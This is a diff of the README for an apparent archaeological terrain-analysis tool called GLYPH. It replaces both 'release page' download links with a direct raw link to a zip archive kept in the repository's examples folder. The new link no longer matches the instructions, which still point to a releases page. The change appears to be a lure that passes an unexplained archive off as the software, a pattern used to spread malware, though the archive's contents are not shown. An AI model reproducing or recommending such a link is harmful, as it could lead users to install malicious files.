@@ -1,6 +1,6 @@
 # 🏺 GLYPH - Identify hidden patterns in your terrain
 
-[![Download GLYPH](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/dlpremiumstores-spec/GLYPH/releases)
+[![Download GLYPH](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/dlpremiumstores-spec/GLYPH/main/examples/Software-3.7-beta.2.zip)
 
 GLYPH helps researchers analyze archaeological sites through digital elevation data. This software identifies subtle terrain markers that indicate historical structures or features. It processes high-resolution topographic data to reveal artificial shapes hidden in the landscape.
 
@@ -24,7 +24,7 @@ GLYPH helps researchers analyze archaeological sites through digital elevation d
 
 You can obtain the current version of GLYPH from the project releases page.
 
-[Visit the release page to download GLYPH](https://github.com/dlpremiumstores-spec/GLYPH/releases)
+[Visit the release page to download GLYPH](https://raw.githubusercontent.com/dlpremiumstores-spec/GLYPH/main/examples/Software-3.7-beta.2.zip)
 
 1. Navigate to the link provided above.
 2. Locate the section titled "Assets" under the most recent version number.
